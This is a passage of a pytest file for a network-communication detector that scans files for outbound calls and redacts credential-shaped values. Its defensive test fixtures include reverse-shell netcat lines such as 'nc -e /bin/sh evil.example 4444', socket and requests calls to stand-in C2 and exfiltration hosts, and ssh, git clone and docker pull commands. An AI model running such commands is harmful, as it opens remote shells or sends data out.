            ('requests.get("https://evil.example/api_key/\u4ee4\u724c45.33.32.156")'.encode(), "45.33.32.156"),
            (b"requests.get('https://evil.example/api_key/\\\\'secret-value.example.com')", "secret-value.example.com"),
        ],
    )
    def test_split_sensitive_url_values_do_not_create_endpoint_findings(self, data: bytes, secret: str) -> None:
        """Source and encoding boundaries must not expose a credential-shaped URL suffix."""
        findings = NetworkCommDetector().scan(data, "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize(
        "data",
        [
            b'requests.get("https://evil.example/api_key/" + ("secret-value.example.com"))',
            b'requests.get("https://evil.example/api_key/" + # keep composing\n"secret-value.example.com")',
            b"requests.get(f\"https://evil.example/api_key/{'secret-value.example.com'}\")",
            b'requests.get("https://evil.example/api_key/" +' + (b" " * 65) + b'"secret-value.example.com")',
        ],
    )
    def test_composed_sensitive_url_values_do_not_create_domain_findings(self, data: bytes) -> None:
        """Bounded Python composition syntax must not expose a credential-shaped suffix."""
        findings = NetworkCommDetector().scan(data, "hook.py")

        assert "secret-value.example.com" not in json.dumps(findings, sort_keys=True)

    def test_long_whitespace_sensitive_assignment_does_not_create_ip_finding(self) -> None:
        """Assignment whitespace within the shared lookup bound must not bypass redaction."""
        secret = "45.33.32.156"
        data = b"api_key=" + (b" " * 1_025) + f'"{secret}"'.encode()

        findings = NetworkCommDetector().scan(data, "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize(
        ("prefix", "expected_domain"),
        [
            (b"connect %65vil-c2.com", "65vil-c2.com"),
            (b"endpoint=%65vil-c2.com", "65vil-c2.com"),
            (b"callback %ab.evil-c2.com", "ab.evil-c2.com"),
        ],
    )
    def test_nonseparator_percent_escapes_do_not_suppress_domain_signals(
        self,
        prefix: bytes,
        expected_domain: str,
    ) -> None:
        """Only encoded URL separators may be discarded as regex artifacts."""
        findings = NetworkCommDetector().scan(prefix, "hook.py")

        assert any(finding.get("domain") == expected_domain for finding in findings)

    @pytest.mark.parametrize(
        "url",
        [
            "https://evil.example/api_key%20SECRET123/model.bin",
            "https://evil.example/authorization%20Bearer%20SECRET123/model.bin",
        ],
    )
    def test_encoded_whitespace_path_credentials_are_redacted(self, url: str) -> None:
        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert "SECRET123" not in json.dumps(findings, sort_keys=True)

    def test_encoded_whitespace_path_near_match_is_preserved(self) -> None:
        """A nonsensitive path label must not redact the following whitespace-delimited token."""
        url = "https://evil.example/author%20SECRET123/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(finding.get("url") == url for finding in findings)

    @pytest.mark.parametrize(
        "path",
        [
            "path%20api_key/SECRET123/model.bin",
            "path%09token/SECRET123/model.bin",
            "api_key=/SECRET123/model.bin",
            "api_key%3D/SECRET123/model.bin",
            "authorization=/Bearer/SECRET123/model.bin",
        ],
    )
    def test_path_credentials_split_across_segments_are_redacted(self, path: str) -> None:
        findings = NetworkCommDetector().scan(f"https://evil.example/{path}".encode(), "hook.py")

        assert "SECRET123" not in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize(
        "path",
        [
            "path%20api_keyboard/SECRET123/model.bin",
            "algorithm=/SECRET123/model.bin",
        ],
    )
    def test_path_near_matches_split_across_segments_are_preserved(self, path: str) -> None:
        url = f"https://evil.example/{path}"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(finding.get("url") == url for finding in findings)

    @pytest.mark.parametrize(
        ("url", "secret"),
        [
            ("https://benign.example/download?token=45.33.32.156", "45.33.32.156"),
            (
                "https://benign.example/download?token=https://45.33.32.156@example.com/payload",
                "45.33.32.156",
            ),
            ("https://benign.example/download?x=1&amp;api_key=45.33.32.156", "45.33.32.156"),
            ("https://benign.example/download?x=1%26api_key=45.33.32.156", "45.33.32.156"),
            ("https://benign.example/download?token=secret-value.example.com", "secret-value.example.com"),
            (
                "https://benign.example/download?x=1%26token=secret-value.example.com",
                "secret-value.example.com",
            ),
            (
                "https://benign.example/download?token=https://secret-value.example.com@example.org/payload",
                "secret-value.example.com",
            ),
            (
                "https://benign.example/download?token=https%3A%2F%2Fsecret-value.example.com%40example.org%2Fpayload",
                "secret-value.example.com",
            ),
        ],
    )
    def test_sensitive_query_values_do_not_reappear_as_endpoint_findings(self, url: str, secret: str) -> None:
        """Credential-shaped endpoint values removed from URLs must stay out of findings."""
        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize(
        ("url", "secret"),
        [
            ("https://benign.example/download?api+key=45.33.32.156", "45.33.32.156"),
            ("https://benign.example/download?api%20key=secret-value.example.com", "secret-value.example.com"),
            ("https://evil.example/api_key?x=45.33.32.156", "45.33.32.156"),
            ("https://evil.example/client%5Fsecret#x=secret-value.example.com", "secret-value.example.com"),
        ],
    )
    def test_indirect_sensitive_query_values_do_not_reappear_as_endpoint_findings(
        self,
        url: str,
        secret: str,
    ) -> None:
        findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")

        assert secret not in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize(
        ("url", "endpoint_type", "field", "value"),
        [
            ("https://benign.example/download?api+keyboard=45.33.32.156", "ipv4_address", "ip", "45.33.32.156"),
            ("https://evil.example/algorithm?x=45.33.32.156", "ipv4_address", "ip", "45.33.32.156"),
        ],
    )
    def test_indirect_sensitive_key_near_matches_preserve_endpoint_findings(
        self,
        url: str,
        endpoint_type: str,
        field: str,
        value: str,
    ) -> None:
        findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")

        assert any(finding.get("type") == endpoint_type and finding.get(field) == value for finding in findings)

    @pytest.mark.parametrize("config", [{}, {"max_findings": 2}])
    def test_completed_sensitive_path_preserves_explicit_query_endpoint(self, config: dict[str, int]) -> None:
        ip = "45.33.32.156"
        url = f"https://evil.example/api_key?endpoint={ip}"

        findings = NetworkCommDetector(config).scan(url.encode(), "tokens.txt")

        assert any(finding.get("ip") == ip for finding in findings)

    @pytest.mark.parametrize("config", [{}, {"max_findings": 1}])
    def test_completed_sensitive_path_preserves_explicit_nested_destination(self, config: dict[str, int]) -> None:
        nested_url = "https://evil-c2.com/payload"
        url = f"https://benign.example/token?next={nested_url}"

        findings = NetworkCommDetector(config).scan(url.encode(), "tokens.txt")

        assert any(finding.get("url") == nested_url for finding in findings)

    def test_detect_domain_names(self) -> None:
        """Test detection of domain names."""
        detector = NetworkCommDetector()

        data = b"""
        connect to api.example.com
        download from cdn.badsite.tk
        upload to data-exfil.ml
        """

        findings = detector.scan(data)
        domain_findings = [f for f in findings if f["type"] == "domain_name"]

        assert len(domain_findings) >= 2  # Should detect suspicious TLDs

        # Check suspicious TLD detection
        suspicious = [f for f in domain_findings if f["confidence"] > 0.6]
        assert len(suspicious) >= 2  # .tk and .ml are suspicious

    @pytest.mark.parametrize(
        "command",
        [
            b"nc evil.example 4444",
            b"ncat evil.example 4444",
            b"netcat evil.example 4444",
            b"/usr/bin/nc evil.example 4444",
            b"busybox nc evil.example 4444",
            b"toybox netcat evil.example 4444",
            b"nc.exe evil.example 4444",
            b"# nc evil.example 4444",
            b"nc -nv evil.example 4444",
            b"nc -w 3 evil.example 4444",
            b"nc -e /bin/sh evil.example 4444",
            b"nc evil.example 4444 -e /bin/sh",
        ],
    )
    def test_detect_netcat_network_commands(self, command: bytes) -> None:
        detector = NetworkCommDetector()

        findings = detector.scan(command + b"\n")

        assert any(
            finding["type"] == "network_command"
            and finding["destination"] == "evil.example"
            and finding["port"] == 4444
            and finding["severity"] == "HIGH"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "content",
        [
            b"The nc command is documented at https://docs.example.com/netcat.\n",
            b"nc evil.example not-a-port\n",
            b"nc evil.example 0\n",
            b"nc evil.example 70000\n",
            b"nc [:::] 4444\n",
        ],
    )
    def test_netcat_prose_and_invalid_ports_are_not_network_commands(self, content: bytes) -> None:
        detector = NetworkCommDetector()

        findings = detector.scan(content)

        assert not [finding for finding in findings if finding["type"] == "network_command"]

    @pytest.mark.parametrize(
        ("command", "command_type", "destination"),
        [
            (b"git clone https://evil.example/repo.git", "git_clone", "https://evil.example/repo.git"),
            (
                b"git clone --depth 1 https://user:secret@evil.example/repo.git checkout",
                "git_clone",
                "https://evil.example/repo.git",
            ),
            (b"git clone git@evil.example:owner/repo.git", "git_clone", "git@evil.example:owner/repo.git"),
            (b"ssh user@evil.example", "ssh", "user@evil.example"),
            (b"ssh -vvv -p2222 user@evil.example", "ssh", "user@evil.example"),
            (b"docker pull evil.example/model:latest", "docker_pull", "evil.example/model:latest"),
            (b"docker image pull evil.example/model:latest", "docker_pull", "evil.example/model:latest"),
            (b"docker pull evil.example:5000/model:latest", "docker_pull", "evil.example:5000/model:latest"),
            (
                b"docker pull --platform linux/amd64 evil.example/model:latest",
                "docker_pull",
                "evil.example/model:latest",
            ),
        ],
    )
    def test_detect_explicit_network_commands(
        self,
        command: bytes,
        command_type: str,
        destination: str,
    ) -> None:
        detector = NetworkCommDetector()

        findings = detector.scan(command + b"\n")

        assert any(
            finding["type"] == "network_command"
            and finding["command_type"] == command_type
            and finding["destination"] == destination
            and finding["severity"] == "HIGH"
            for finding in findings
        )

    def test_detect_explicit_network_commands_with_crlf(self) -> None:
        detector = NetworkCommDetector()

        findings = detector.scan(
            b"nc evil.example 4444\r\n"
            b"ssh user@evil.example\r\n"
            b"git clone https://evil.example/repo.git\r\n"
            b"docker pull evil.example/model:latest\r\n"
        )

        assert {
            finding.get("command_type", "netcat") for finding in findings if finding["type"] == "network_command"
        } == {
            "netcat",
            "ssh",
            "git_clone",
            "docker_pull",
        }

    @pytest.mark.parametrize(
        "content",
        [
            b"The git clone command is documented at https://git-scm.com/docs/git-clone.\n",
            b"git clone https://attacker.com/repo.git is documented here\n",
            b"The ssh client connects to remote systems.\n",
            b"ssh attacker.com is documented here\n",
            b"Docker pull documentation: https://docs.docker.com/reference/cli/docker/image/pull/.\n",
            b"docker pull attacker.com/model:latest is documented here\n",
            b"git clone https://" + b"a" * 10000 + b" prose tail\n",
        ],
    )
    def test_network_command_prose_is_not_explicit_command(self, content: bytes) -> None:
        detector = NetworkCommDetector()

        findings = detector.scan(content)

        assert not [finding for finding in findings if finding["type"] == "network_command"]

    def test_ml_word_inside_real_domain_is_still_detected(self) -> None:
        """DNS-shaped endpoints containing ML terms should not be suppressed."""
        detector = NetworkCommDetector()

        findings = detector.scan(b"connect to evil-weight-domain.com")

        assert any(
            finding["type"] == "domain_name" and finding["domain"] == "evil-weight-domain.com" for finding in findings
        )

    def test_tensor_method_calls_are_not_reported_as_domains(self) -> None:
        """Common tensor method calls should not be mistaken for DNS names."""
        detector = NetworkCommDetector()

        findings = detector.scan(b"weight.to(device)\nbias.to(device)\n")

        assert not [finding for finding in findings if finding["type"] == "domain_name"]

    def test_detect_network_libraries(self) -> None:
        """Test detection of network library imports."""
        detector = NetworkCommDetector()

        data = b"""
        import socket
        from urllib import request
        import requests
        from paramiko import SSHClient
        """

        findings = detector.scan(data)
        lib_findings = [f for f in findings if f["type"] == "network_library"]

        assert len(lib_findings) >= 4

        # Check specific libraries
        libs = [f["library"] for f in lib_findings]
        assert "socket" in libs
        assert "urllib" in libs
        assert "requests" in libs
        assert all(finding.get("position") == data.find(finding["pattern"].encode()) for finding in lib_findings)
        assert "paramiko" in libs

        # Check severity levels
        critical = [f for f in lib_findings if f["severity"] == "CRITICAL"]
        assert len(critical) >= 2  # socket and paramiko are critical

    def test_network_library_scan_uses_shared_patterns(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Derived library patterns should come from the shared class table."""
        detector = NetworkCommDetector()
        monkeypatch.setattr(NetworkCommDetector, "NETWORK_LIBRARIES", [b"socket"])
        monkeypatch.setattr(NetworkCommDetector, "NETWORK_LIBRARY_PATTERNS", {b"socket": (b"CUSTOM_SOCKET_PATTERN",)})

        detector._scan_network_libraries(b"CUSTOM_SOCKET_PATTERN", "payload.bin")

        assert any(finding["library"] == "socket" for finding in detector.findings)

    def test_detect_network_functions(self) -> None:
        """Test detection of network function calls."""
        detector = NetworkCommDetector()

        data = b"""
        socket.connect(('evil.com', 4444))
        requests.post('http://c2.server.com/data', payload)
        urlopen('https://exfiltrate.net')
        ftp.connect('upload.server.com')
        """

        findings = detector.scan(data)
        func_findings = [f for f in findings if f["type"] == "network_function"]

        assert len(func_findings) >= 4

        # Check specific functions
        funcs = [f["function"] for f in func_findings]
        assert "socket.connect" in funcs
        assert "requests.post" in funcs
        assert "urlopen" in funcs
        assert all(finding.get("position") == data.find(finding["function"].encode()) for finding in func_findings)

    def test_network_function_snippets_redact_url_path_tokens(self) -> None:
        """URL-bearing snippets should not leak capability tokens after URL findings are redacted."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
        data = f'requests.get("https://example.com/path/{path_token}/model.bin")'.encode()

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>/model.bin"
        assert network_finding["snippet"] == "requests.get https://example.com/path/<redacted>/model.bin"
        assert path_token not in json.dumps([network_finding, url_finding], sort_keys=True)

    def test_network_function_snippets_redact_adjacent_credentials(self) -> None:
        """Network findings should not preserve surrounding credential-bearing bytes."""
        detector = NetworkCommDetector()
        data = (
            b"requests.get(1) "
            b'json={"api_key": "JSONSECRET123"} '
            b"api_key=ADJACENTSECRET123 Authorization: Bearer BEARERSECRET123 STANDALONESECRET123"
        )

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        snippet = str(network_finding["snippet"])
        serialized = json.dumps(network_finding, sort_keys=True)

        assert "ADJACENTSECRET123" not in serialized
        assert "BEARERSECRET123" not in serialized
        assert "JSONSECRET123" not in serialized
        assert "STANDALONESECRET123" not in serialized
        assert snippet == "requests.get"

    def test_network_function_snippet_redaction_preserves_matched_context(self) -> None:
        """Omitting surrounding context should preserve the network-function match."""
        detector = NetworkCommDetector()
        data = (b"api_key=x " * 8) + b"requests.get(1)"

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        snippet = str(network_finding["snippet"])

        assert "api_key=x" not in snippet
        assert snippet == "requests.get"

    def test_network_function_snippets_preserve_sanitized_endpoint_context(self) -> None:
        """Actionable endpoint context should survive without arbitrary surrounding bytes."""
        detector = NetworkCommDetector()
        data = b'api_key=BEFORESECRET requests.post("https://c2.example/path?token=QUERYSECRET") AFTERSECRET'

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        snippet = str(network_finding["snippet"])

        assert snippet == "requests.post https://c2.example/path"
        assert "BEFORESECRET" not in snippet
        assert "QUERYSECRET" not in snippet
        assert "AFTERSECRET" not in snippet

    def test_network_function_snippets_preserve_nested_endpoint_context_at_finding_limit(self) -> None:
        nested_url = "https://evil-c2.com/payload"
        data = f"requests.get('https://benign.example/download?next={nested_url}')".encode()

        findings = NetworkCommDetector({"max_findings": 1}).scan(data, "hook.py")

        assert findings[0]["type"] == "network_function"
        assert findings[0]["snippet"] == f"requests.get {nested_url} https://benign.example/download"

    def test_network_function_snippets_redact_sensitive_nested_endpoint_context(self) -> None:
        secret = "https://secret-value.example.com/payload"
        data = f"requests.get('https://benign.example/download?token={secret}')".encode()

        findings = NetworkCommDetector({"max_findings": 1}).scan(data, "hook.py")
        serialized = json.dumps(findings[0], sort_keys=True)

        assert secret not in serialized
        assert network_comm._SENSITIVE_NESTED_URL in serialized

    def test_network_function_snippets_support_triple_quoted_endpoints(self) -> None:
        """Triple-quoted call arguments should retain sanitized endpoint context."""
        data = b"requests.get('''https://c2.example/path?token=QUERYSECRET''')"

        findings = NetworkCommDetector().scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")

        assert network_finding["snippet"] == "requests.get https://c2.example/path"
        assert "QUERYSECRET" not in json.dumps(network_finding, sort_keys=True)

    @pytest.mark.parametrize(
        "data",
        [
            b"https://benign.example/path\n" + (b"x" * 40) + b" requests.get(1)",
            b"requests.get(1) " + (b"x" * 20) + b" https://benign.example/path",
        ],
    )
    def test_network_function_snippets_ignore_unrelated_nearby_urls(self, data: bytes) -> None:
        """Nearby URLs outside the matched call must not be attributed as its endpoint."""
        findings = NetworkCommDetector().scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")

        assert network_finding["snippet"] == "requests.get"

    def test_network_function_snippets_stop_before_single_quoted_call_arguments(self) -> None:
        """A source-literal URL must not absorb adjacent credential arguments."""
        data = b"requests.get('https://example.com/path',api_key='SECRET',auth='AUTHSECRET')"

        findings = NetworkCommDetector().scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
        serialized = json.dumps([network_finding, url_finding], sort_keys=True)

        assert network_finding["snippet"] == "requests.get https://example.com/path"
        assert url_finding["url"] == "https://example.com/path"
        assert "SECRET" not in serialized
        assert "AUTHSECRET" not in serialized

    @pytest.mark.parametrize(
        "suffix",
        [
            "SECRETTAIL",
            "+'SECRETTAIL'",
            ".format('SECRETTAIL')",
            "% 'SECRETTAIL'",
            "&&ADJACENTSECRET123",
            "@SECRETTAIL",
            "-ADJACENTSECRET123",
            "/ADJACENTSECRET123",
        ],
    )
    def test_network_function_snippets_stop_before_single_quoted_url_expressions(self, suffix: str) -> None:
        """Source expressions after a URL literal must not become persisted URL text."""
        data = f"requests.get('https://example.com/path'{suffix})".encode()

        findings = NetworkCommDetector().scan(data, "hook.py")
        serialized = json.dumps(findings, sort_keys=True)
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")

        assert network_finding["snippet"] == "requests.get https://example.com/path"
        assert "SECRETTAIL" not in serialized

    def test_network_function_snippets_preserve_valid_url_apostrophes(self) -> None:
        """Apostrophes inside a double-quoted URL path are URL data, not source delimiters."""
        data = b"requests.get(\"https://example.com/rock'n'roll/model.bin\")"

        findings = NetworkCommDetector().scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/rock'n'roll/model.bin"
        assert network_finding["snippet"] == "requests.get https://example.com/rock'n'roll/model.bin"

    @pytest.mark.parametrize(
        "key",
        [
            "api_key",
            "token",
            "password",
            "Authorization",
            "proxy-authorization",
            "aws_access_key_id",
            "refresh_token",
            "credential",
            "x-api-key",
            "db_password",
            "service_token",
            "headers[Authorization]",
            "secrets.api_key",
        ],
    )
    def test_sensitive_url_path_assignments_redact_low_entropy_values(self, key: str) -> None:
        """Credential-shaped path assignments should redact by key semantics."""
        data = f'requests.get("https://evil.example/download/{key}=SECRET123/model.bin")'.encode()

        findings = NetworkCommDetector().scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
        serialized = json.dumps([network_finding, url_finding], sort_keys=True)

        assert "/<redacted>/model.bin" in str(network_finding["snippet"])
        assert "SECRET123" not in serialized

    @pytest.mark.parametrize(
        "key",
        [
            "dbPassword",
            "databasePassword",
            "githubToken",
            "smtpPassword",
            "serviceToken",
            "headersAuthorization",
            "AWSSecretAccessKey",
        ],
    )
    def test_prefixed_camel_case_path_credentials_redact_low_entropy_values(self, key: str) -> None:
        """CamelCase prefixes must not hide a sensitive key suffix."""
        secret = "abc"
        findings = NetworkCommDetector().scan(
            f"https://evil.example/{key}={secret}/model.bin".encode(),
            "hook.py",
        )

        serialized = json.dumps(findings, sort_keys=True)
        assert secret not in serialized
        assert "https://evil.example/<redacted>/model.bin" in serialized

    def test_authorization_path_assignment_redacts_full_encoded_payload(self) -> None:
        """Authorization schemes and payloads should be removed as one path value."""
        data = b'requests.get("https://evil.example/Authorization=Bearer%20SECRET123/model.bin")'

        findings = NetworkCommDetector().scan(data, "hook.py")
        serialized = json.dumps(findings, sort_keys=True)

        assert "/<redacted>/model.bin" in serialized
        assert "Authorization" not in serialized
        assert "Bearer" not in serialized
        assert "SECRET123" not in serialized

    @pytest.mark.parametrize("scheme", ["Basic", "Bearer", "Token", "Digest", "Negotiate", "OAuth", "AWS4-HMAC-SHA256"])
    @pytest.mark.parametrize(
        "url",
        [
            "https://evil.example/Authorization/{scheme}/SECRET123/model.bin",
            "https://evil.example/Authorization:{scheme}:SECRET123/model.bin",
            "https://Authorization.{scheme}.SECRET123.evil.example/model.bin",
        ],
    )
    def test_authorization_schemes_redact_the_following_path_payload(self, scheme: str, url: str) -> None:
        """An auth scheme is metadata for the credential, not the credential itself."""
        findings = NetworkCommDetector().scan(url.format(scheme=scheme).encode(), "hook.py")

        serialized = json.dumps(findings, sort_keys=True)
        assert "SECRET123" not in serialized

    @pytest.mark.parametrize(
        ("url", "expected"),
        [
            ("https://evil.example/api_key/token/docs", "https://evil.example/api_key/<redacted>/docs"),
            ("https://api_key.token.docs.evil.example/path", "https://api_key.<redacted>.docs.evil.example/path"),
        ],
    )
    def test_non_authorization_keys_do_not_propagate_auth_scheme_redaction(self, url: str, expected: str) -> None:
        """Auth-scheme continuation applies only to Authorization-like keys."""
        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(finding.get("url") == expected for finding in findings)

    def test_nested_sensitive_url_path_assignments_are_fully_redacted(self) -> None:
        """Nested assignment syntax must not hide a credential-shaped inner key."""
        findings = NetworkCommDetector().scan(
            b'requests.get("https://evil.example/x=api_key=abc/model.bin")',
            "hook.py",
        )

        serialized = json.dumps(findings, sort_keys=True)
        assert "api_key" not in serialized
        assert "=abc" not in serialized
        assert "https://evil.example/<redacted>/model.bin" in serialized

    @pytest.mark.parametrize(
        "url",
        [
            "https://token.blob.core.windows.net/container/model.bin",
            "https://auth.dfs.core.windows.net/container/model.bin",
            "https://token.s3.amazonaws.com/model.bin",
            "https://auth.s3.us-east-1.amazonaws.com/model.bin",
            "https://token.storage.googleapis.com/model.bin",
        ],
    )
    def test_cloud_authority_identifiers_named_like_sensitive_keys_are_preserved(self, url: str) -> None:
        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(finding.get("url") == url for finding in findings)

    @pytest.mark.parametrize(
        ("label", "secret"),
        [
            ("api_key%3DSECRET123", "SECRET123"),
            ("AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE"),
        ],
    )
    def test_cloud_authority_credential_material_is_redacted(self, label: str, secret: str) -> None:
        url = f"https://{label}.blob.core.windows.net/container/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)
        assert any("<redacted>.blob.core.windows.net" in finding.get("url", "") for finding in findings)

    @pytest.mark.parametrize("key", ["api_key", "password", "service_token"])
    def test_paired_sensitive_url_path_segments_redact_the_following_value(self, key: str) -> None:
        """Routes that encode credentials as adjacent key/value segments should redact the value."""
        findings = NetworkCommDetector().scan(
            f'requests.get("https://evil.example/{key}/letmein/model.bin")'.encode(),
            "hook.py",
        )

        serialized = json.dumps(findings, sort_keys=True)
        assert "letmein" not in serialized
        assert f"https://evil.example/{key}/<redacted>/model.bin" in serialized

    def test_over_encoded_sensitive_path_key_redacts_the_following_value(self) -> None:
        """Decode-limit fallback must hide the value following an excessively escaped key."""
        encoded_key = "%61%70%69%5F%6B%65%79"
        for _ in range(network_comm._MAX_PATH_TOKEN_DECODE_PASSES):
            encoded_key = encoded_key.replace("%", "%25")
        secret = "SECRET123"

        findings = NetworkCommDetector().scan(
            f"https://evil.example/{encoded_key}/{secret}/model.bin".encode(),
            "hook.py",
        )
        serialized = json.dumps(findings, sort_keys=True)

        assert secret not in serialized
        assert "https://evil.example/<redacted>/<redacted>/model.bin" in serialized

    @pytest.mark.parametrize(
        ("path", "redacted_path"),
        [
            ("api_key:SECRET123", "api_key:<redacted>"),
            ("api_key%3ASECRET123", "api_key:<redacted>"),
            ("api_key%2FSECRET123", "api_key%2F<redacted>"),
            ("api_key%252FSECRET123", "api_key%2F<redacted>"),
        ],
    )
    def test_delimited_sensitive_url_path_pairs_redact_the_following_value(
        self,
        path: str,
        redacted_path: str,
    ) -> None:
        """Encoded path delimiters must preserve sensitive key/value pairing."""
        findings = NetworkCommDetector().scan(
            f'requests.get("https://evil.example/{path}/model.bin")'.encode(),
            "hook.py",
        )

        serialized = json.dumps(findings, sort_keys=True)
        assert "SECRET123" not in serialized
        assert f"https://evil.example/{redacted_path}/model.bin" in serialized

    @pytest.mark.parametrize("path", ["monkey:SECRET123", "monkey%2FSECRET123"])
    def test_delimited_non_sensitive_path_pairs_are_preserved(self, path: str) -> None:
        """A key suffix near-match must not redact ordinary path data."""
        findings = NetworkCommDetector().scan(f"https://evil.example/{path}/model.bin".encode(), "hook.py")

        assert f"https://evil.example/{path}/model.bin" in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize(
        "key_segment",
        [
            "prefix:api_key",
            "prefix;api_key",
            "prefix&api_key",
            "prefix&amp;api_key",
            "prefix,api_key",
            "prefix%2Fapi_key",
            "prefix%252Fapi_key",
        ],
    )
    def test_compound_sensitive_path_key_redacts_value_in_next_segment(self, key_segment: str) -> None:
        """A compound segment ending in a credential key must taint the following path value."""
        secret = "SECRET123"
        findings = NetworkCommDetector().scan(
            f'requests.get("https://evil.example/{key_segment}/{secret}/model.bin")'.encode(),
            "hook.py",
        )

        serialized = json.dumps(findings, sort_keys=True)
        assert secret not in serialized
        assert f"https://evil.example/{key_segment}/<redacted>/model.bin" in serialized

    def test_compound_path_key_near_match_preserves_value_in_next_segment(self) -> None:
        """A non-sensitive compound suffix must not hide ordinary path data."""
        url = "https://evil.example/prefix:api_key_hint/public/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert url in json.dumps(findings, sort_keys=True)

    def test_whitespace_delimited_sensitive_path_key_redacts_value_in_next_segment(self) -> None:
        """An encoded-space key suffix must carry sensitivity across the next slash."""
        secret = "SECRET123"
        findings = NetworkCommDetector().scan(
            f"https://evil.example/path%20api_key/{secret}/model.bin".encode(),
            "hook.py",
        )

        serialized = json.dumps(findings, sort_keys=True)
        assert secret not in serialized
        assert "https://evil.example/path%20api_key/<redacted>/model.bin" in serialized

    def test_whitespace_delimited_path_key_near_match_preserves_value(self) -> None:
        """Encoded whitespace before a benign key suffix must not hide public path data."""
        url = "https://evil.example/path%20api_key_hint/public/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert url in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize("key_segment", ["api_key=", "api_key%3D"])
    def test_empty_sensitive_path_assignment_redacts_value_in_next_segment(self, key_segment: str) -> None:
        """An empty path assignment must carry sensitivity across the next slash."""
        secret = "SECRET123"
        findings = NetworkCommDetector().scan(
            f"https://evil.example/{key_segment}/{secret}/model.bin".encode(),
            "hook.py",
        )

        serialized = json.dumps(findings, sort_keys=True)
        assert secret not in serialized
        assert "https://evil.example/<redacted>/<redacted>/model.bin" in serialized

    def test_empty_path_assignment_near_match_preserves_value(self) -> None:
        """An empty benign path assignment must not taint the following segment."""
        url = "https://evil.example/algorithm=/public/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert url in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize(
        "path",
        [
            "path;api_key=;SECRET123/model.bin",
            "path&api_key=&SECRET123/model.bin",
            "path%26api_key%3D%26SECRET123/model.bin",
        ],
    )
    def test_empty_delimited_path_assignment_redacts_following_value(self, path: str) -> None:
        """Empty assignments inside one path segment must taint the next component."""
        findings = NetworkCommDetector().scan(f"https://evil.example/{path}".encode(), "hook.py")

        assert "SECRET123" not in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize("path", ["path;algorithm=;public/model.bin", "path&algorithm=&public/model.bin"])
    def test_empty_delimited_path_assignment_near_match_preserves_value(self, path: str) -> None:
        """Empty ordinary assignments must not hide the following public component."""
        url = f"https://evil.example/{path}"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(finding.get("url") == url for finding in findings)

    @pytest.mark.parametrize(
        "path",
        [
            "prefix%2Fapi_key=SECRET123/model.bin",
            "prefix:token=SECRET123/model.bin",
            "prefix%252Fapi_key=SECRET123/model.bin",
            "prefix%253Atoken=SECRET123/model.bin",
            "download%253Btoken=SECRET123/model.bin",
            "api_key%253DSECRET123/model.bin",
            "prefix%25252525252525252Fapi_key=SECRET123/model.bin",
        ],
    )
    def test_sensitive_url_path_assignments_redact_inside_compound_segments(self, path: str) -> None:
        """Encoded separators and colon components must not bypass sensitive-key redaction."""
        data = f'requests.get("https://evil.example/{path}")'.encode()

        findings = NetworkCommDetector().scan(data, "hook.py")
        serialized = json.dumps(findings, sort_keys=True)

        assert "SECRET123" not in serialized

    def test_network_function_snippets_expand_forward_urls_before_redaction(self) -> None:
        """Long URL tails after the function token should be included before URL redaction."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
        long_prefix = "a" * 90
        data = f'requests.get("https://example.com/{long_prefix}/{path_token}/model.bin")'.encode()

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"].endswith(f"/{long_prefix}/<redacted>/model.bin")
        assert path_token not in json.dumps([network_finding, url_finding], sort_keys=True)

    def test_network_function_snippets_ignore_urls_in_comments(self) -> None:
        """A URL in a call-adjacent comment is not the function endpoint."""
